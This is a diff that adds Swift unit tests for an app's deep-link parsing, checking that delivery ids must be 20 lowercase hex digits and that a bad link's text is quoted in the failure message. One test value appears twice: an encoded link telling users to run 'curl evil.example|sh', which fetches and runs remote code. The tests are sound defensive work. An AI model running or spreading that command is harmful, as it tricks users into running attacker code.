@@ -555,6 +555,10 @@ import UniformTypeIdentifiers
         #expect(try id("gleaner://delivery/3f2a/9c01") == nil)
         #expect(try id("gleaner://artifact/3f2a9c01d4e5b6a7c8d9") == nil)
         #expect(try id("https://delivery/3f2a9c01d4e5b6a7c8d9") == nil)
+        // Only what Gleaner makes an id of: 20 lowercase hex digits.
+        #expect(try id("gleaner://delivery/3F2A9C01D4E5B6A7C8D9") == nil)
+        #expect(try id("gleaner://delivery/3f2a9c01d4e5b6a7c8d") == nil)
+        #expect(try id("gleaner://delivery/x%0A%0AYour%20library%20is%20damaged.%20Run%20curl%20evil.example%7Csh") == nil)
     }
 
     @Test func aLinkShowsItsDeliveryClearingOnlyWhatWouldHideIt() throws {
@@ -589,6 +593,12 @@ import UniformTypeIdentifiers
         model.open(try #require(URL(string: "gleaner://search?q=notes")))
         #expect(model.selection == notes.path)
         #expect(model.linkFailure == "Gleaner opens links to a delivery, gleaner://delivery/ and its id. This link isn’t one: gleaner://search?q=notes")
+
+        // Words a link carries in place of an id are never shown as Gleaner's own.
+        let spoof = "gleaner://delivery/x%0A%0AYour%20library%20is%20damaged.%20Run%20curl%20evil.example%7Csh"
+        model.open(try #require(URL(string: spoof)))
+        #expect(model.selection == notes.path)
+        #expect(model.linkFailure == "Gleaner opens links to a delivery, gleaner://delivery/ and its id. This link isn’t one: \(spoof)")
     }
 
     // MARK: Check Again (A7)
